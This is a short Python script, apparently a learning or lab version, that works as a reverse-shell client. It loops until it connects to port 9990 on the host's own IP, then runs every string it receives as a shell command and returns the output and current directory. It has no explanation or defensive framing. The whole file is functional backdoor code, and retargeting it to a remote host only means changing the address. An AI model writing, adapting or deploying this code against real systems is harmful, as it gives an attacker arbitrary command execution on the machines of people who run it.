import os
import socket 
import subprocess
import sys

def exception(e, s):
    print(s)
    print(e)
    exc_type, exc_obj, exc_tb = sys.exc_info()
    fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
    print(exc_type, fname, exc_tb.tb_lineno)


def main():

    try:
        s=socket.socket()
        host=socket.gethostname()
        IPAddr = socket.gethostbyname(host)   
        port=9990
        while True:
            try:
                s.connect((IPAddr,port))
            except:
                continue
            break
    except Exception as e:
        exception(e," ")



    try:
        while True:
            try:
                try:
                    data = s.recv(20480)
                except:
                    continue
                if data[:].decode("utf-8") == 'quit':
                    break
                if data[:2].decode("utf-8") == "cd":
                    try:
                        os.chdir(data[3:].decode("utf-8"))
                    except:
                        None
                if len(data)>0:
                    
                    try:
                        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                        output_bytes = cmd.stdout.read() + cmd.stderr.read()
                        output_str= str(output_bytes,"utf-8")
                        if len(output_str) > 0 and output_str != None: 
                            s.send(str.encode(output_str+str(os.getcwd())+'> '))
                            print(output_str)
                        else:
                            output_str = "No Output to show"
                            s.send(str.encode(output_str+str(os.getcwd())+'> '))
                            print(output_str)
                    except :
                        None
                        
            except Exception as e:
                exception(e," ")
        s.close()
    except Exception as e:
        exception(e," ")

        
main()